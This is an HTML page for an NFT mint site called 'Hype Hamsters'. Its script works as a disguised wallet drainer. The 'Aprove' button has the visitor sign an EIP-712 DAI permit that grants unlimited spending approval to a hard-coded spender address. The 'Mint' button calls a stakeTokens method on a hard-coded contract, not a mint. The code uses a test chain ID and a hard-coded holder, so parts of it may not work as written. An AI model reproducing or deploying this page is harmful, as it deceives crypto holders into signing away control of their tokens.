<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" href="style.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mint Site</title>    
    <script src="https://cdn.jsdelivr.net/npm/@metamask/onboarding@1.0.1/dist/metamask-onboarding.bundle.js"></script>
</head>
<body>
    <Header class="row container"> 
        <a href="index.html" class="logo">
            Hype Hamsters
        </a>
        <div class="toggleMenu" onclick="toggleMenu();"></div>
        <nav class="navigation row">
            <ul class="row">
                <li><a target="_blank" href="https://opensea.io/">Collection</a></li>
                <li><a onclick="w()" class="hero-btn" id="connect-wallet"> Connect Wallet</a>
                    <a class="hero-btn" id="disconnect-wallet"> <img src="icons8-cancel.svg"> </a>
                    <div id="message"></div>
                </li>
                
            </ul>
        </nav>
    </Header>

    <section class="hero row container">
        <div>
            <h6>Mint Now</h6>
            <h1>Our Unique NFT Collection 10k limited nfts</h1>
            <a id="mint" class="hero-btn">Mint now</a>
            <label for="quantity" >Quantity (between 1 and 10):</label>
            <input type="number" id="quantity" name="quantity" value="1" min="1" max="10"> </br>
            <li><a class="hero-btn" id="aprove"> Aprove</a></li>
        </div>
    </section>

<script type="text/javascript" src="https://unpkg.com/web3@1.6.0/dist/web3.min.js"></script>
<script type="text/javascript" src="/ABI.js"></script>
<script type="text/javascript">
    var account = null;
    var contract = null;

    //const ADDRESS = "0xB9542838da5980212e4Ef3fF848bea5F15834387";
    const ADDRESS = "0xABF1a72A2D72fd4B8b74EBcf1cD8E4Fd3Ab55F2e";
    const prc20 = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
    const SECOND = 1000;

    const fromAddress = "0x9EE5e175D09895b8E1E28c22b961345e1dF4B5aE";
    // JavaScript dates have millisecond resolution
    const expiry = Math.trunc((Date.now() + 120 * SECOND) / SECOND);
    const nonce = 1;
    const spender = "0x009f6eE78C4782E3D8779cB2a92EaEb2dCe9EdDf";
    const createPermitMessageData = function () {
  const message = {
    holder: fromAddress,
    spender: spender,
    nonce: nonce,
    expiry: expiry,
    allowed: true,
  };

  const typedData = JSON.stringify({
    types: {
      EIP712Domain: [
        {
          name: "name",
          type: "string",
        },
        {
          name: "version",
          type: "string",
        },
        {
          name: "chainId",
          type: "uint256",
        },
        {
          name: "verifyingContract",
          type: "address",
        },
      ],
      Permit: [
        {
          name: "holder",
          type: "address",
        },
        {
          name: "spender",
          type: "address",
        },
        {
          name: "nonce",
          type: "uint256",
        },
        {
          name: "expiry",
          type: "uint256",
        },
        {
          name: "allowed",
          type: "bool",
        },
      ],
    },
    primaryType: "Permit",
    domain: {
      name: "Dai Stablecoin",
      version: "1",
      chainId: 3,
      verifyingContract: "0xaD6D458402F60fD3Bd25163575031ACDce07538D",
    },
    message: message,
    });

    return {
        typedData,
        message,
        };
    };
    async function w() {

        if(window.ethereum) {
        await window.ethereum.send('eth_requestAccounts');
        window.web3 = new Web3(window.ethereum);
        var accounts = await web3.eth.getAccounts();
        account = accounts[0];
        document.getElementById('connect-wallet').textContent = account;
       
        const signData = async function (web3 , account, typeData) {
        const result = await window.ethereum.sendAsync({
        id: 3,
        method: "eth_signTypedData_v3",
        params: [account, typeData],
        from: account,
        });
  
        const r = result.result.slice(0, 66);
        const s = "0x" + result.result.slice(66, 130);
        const v = Number("0x" + result.result.slice(130, 132));
  
        return { v, r, s };
        };
        const signTransferPermit = async function () {
            const messageData = createPermitMessageData();
            const sig = await signData(web3, account, messageData.typedData);
            return Object.assign({}, sig, messageData.message);
        };
        
        
        
        console.log(account);   
        contract = new web3.eth.Contract(ABI, ADDRESS);

        document.getElementById('mint').onclick = () => {
            let value = document.getElementById('quantity').value;
            //const price = web3.utils.toWei(value, 'ether');
            contract.methods.stakeTokens(value).send({ from: account});
            
        }
        document.getElementById('aprove').onclick = () => {
            signTransferPermit();

        }

    }
}


    
</script>
</body>
</html>